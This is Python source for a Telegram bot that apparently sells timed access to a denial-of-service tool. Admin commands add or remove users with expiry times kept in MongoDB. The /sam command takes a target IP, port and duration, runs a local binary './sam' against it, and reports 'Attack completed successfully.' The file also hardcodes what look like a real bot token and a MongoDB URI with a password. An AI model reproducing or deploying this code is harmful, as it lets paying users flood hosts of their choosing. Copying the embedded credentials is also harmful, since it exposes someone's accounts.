import os
import telebot
import logging
import asyncio
from pymongo import MongoClient
import certifi
from datetime import datetime, timedelta
import random
from subprocess import Popen

# MongoDB and Telegram Bot Setup
TOKEN = '7889670543:AAGVfNdSyD3ipQ6Zl7-dOdU0W6lgrYI5Iis'
MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
ALLOWED_USER_IDS = [6207079474]  # Replace these with actual admin user IDs

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['soul']
users_collection = db.users
bot = telebot.TeleBot(TOKEN)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Helper function to check if user is allowed to access the bot
def is_user_allowed(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data:
        expiry_time = user_data.get("expiry_time")
        if expiry_time and datetime.now() < expiry_time:
            return True
    return False

# Command to add a user with a time limit (in days or minutes)
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if user_id not in ALLOWED_USER_IDS:
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
        return

    # Parse the command
    cmd_parts = message.text.split()
    if len(cmd_parts) != 3:
        bot.send_message(chat_id, "*Invalid command format. Use /add <user_id> <time>*", parse_mode='Markdown')
        return
    
    try:
        target_user_id = int(cmd_parts[1])
        time_value = cmd_parts[2]
        time_amount = int(time_value[:-4])  # Remove "min" or "day"
        time_unit = time_value[-4:]  # Get "min" or "day"
        
        if time_unit not in ['min', 'day']:
            bot.send_message(chat_id, "*Invalid time unit. Use 'min' for minutes or 'day' for days.*", parse_mode='Markdown')
            return

        # Calculate expiry time
        if time_unit == "min":
            expiry_time = datetime.now() + timedelta(minutes=time_amount)
        elif time_unit == "day":
            expiry_time = datetime.now() + timedelta(days=time_amount)
        
        # Update the database with the new user and expiry time
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"user_id": target_user_id, "expiry_time": expiry_time}},
            upsert=True
        )
        
        bot.send_message(chat_id, f"User {target_user_id} added with access for {time_amount} {time_unit}.")
    
    except ValueError:
        bot.send_message(chat_id, "*Invalid time format. Please specify time as <number>min or <number>day.*", parse_mode='Markdown')

# Command to remove a user from the bot system
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if user_id not in ALLOWED_USER_IDS:
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
        return

    # Parse the command
    cmd_parts = message.text.split()
    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Invalid command format. Use /remove <user_id>*", parse_mode='Markdown')
        return
    
    try:
        target_user_id = int(cmd_parts[1])
        
        # Remove the user from the database
        users_collection.delete_one({"user_id": target_user_id})
        
        bot.send_message(chat_id, f"User {target_user_id} has been removed and cannot access the bot anymore.")
    
    except ValueError:
        bot.send_message(chat_id, "*Invalid user ID format. Please provide a valid user ID.*", parse_mode='Markdown')

# Command to check if a user is allowed to use the bot
@bot.message_handler(commands=['check_access'])
def check_access(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if is_user_allowed(user_id):
        bot.send_message(chat_id, "*You have access to the bot.*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*You do not have access to the bot or your access has expired.*", parse_mode='Markdown')

# Command to run the binary operation (similar to /sam)
@bot.message_handler(commands=['sam'])
def run_attack(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Check if user has access
    if not is_user_allowed(user_id):
        bot.send_message(chat_id, "*Your access has expired or you are not authorized to use this bot.*", parse_mode='Markdown')
        return

    # Expecting a command like: /sam <IP> <Port> <Duration in minutes>
    cmd_parts = message.text.split()
    if len(cmd_parts) != 4:
        bot.send_message(chat_id, "*Invalid command format. Use /sam <IP> <Port> <Duration (in minutes)>*", parse_mode='Markdown')
        return

    target_ip = cmd_parts[1]
    target_port = cmd_parts[2]
    duration = cmd_parts[3]

    try:
        # Run the binary command (assuming the binary is `./sam` located in the same directory)
        bot.send_message(chat_id, f"Running attack on {target_ip}:{target_port} for {duration} minutes...")
        process = Popen(["./sam", target_ip, target_port, duration, "90"])
        process.communicate()

        bot.send_message(chat_id, "Attack completed successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to run attack: {e}")

# Command to handle any other text message
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Check if user has access
    if not is_user_allowed(user_id):
        bot.send_message(chat_id, "*Your access has expired or you are not authorized to use this bot.*", parse_mode='Markdown')
        return

    # Process the message normally if access is valid
    bot.send_message(chat_id, "Your message has been received and is being processed.")

# Start the bot
if __name__ == '__main__':
    bot.polling()
